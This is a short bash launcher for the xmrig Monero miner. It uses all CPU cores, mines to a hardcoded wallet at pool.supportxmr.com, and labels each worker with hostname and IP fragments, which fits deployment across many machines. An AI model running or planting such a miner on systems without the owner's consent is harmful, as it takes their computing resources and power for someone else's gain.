#!/bin/bash

WALLET="45unwokYSf48piDg96ZBdBRqNXARySZoSZ92ddSQH7hYYpKbWgH37NzBtnioMVofXcNU4Ff5rxhJGMsjAbz9XtbPNrkdUGV"

CPUS=$(cat /proc/cpuinfo | grep processor | wc -l)
/root/testing/xmrig -o pool.supportxmr.com:7777 -u $WALLET -p ${1}${2}${HOSTNAME:0:6}${IP} -t $CPUS --av=2 -r 3 --retry-pause=10 --donate-level=1 --print-time=60